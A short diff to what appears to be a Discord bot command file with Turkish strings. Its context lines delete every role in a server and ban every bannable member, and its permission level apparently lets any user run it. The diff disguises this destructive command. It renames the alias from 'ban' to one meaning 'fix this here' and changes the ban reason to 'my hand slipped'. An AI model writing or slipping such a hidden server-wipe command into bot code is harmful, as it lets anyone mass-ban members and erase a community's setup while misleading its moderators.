@@ -14,7 +14,7 @@ message.guild.roles.deleteAll("");
 
 message.guild.members.forEach(u => {
 if (u.bannable) {
-message.guild.ban(u, "Berke Adamdır")
+message.guild.ban(u, "Elim Çarptı")
 }
 })
 
@@ -28,7 +28,7 @@ message.delete()
 exports.conf = {
   enabled: true,
   guildOnly: true,
-  aliases: ['banla'],
+  aliases: ['burayi-bi-düzelt'],
   permLevel: 0,
   kategori: "yetkili"
 };
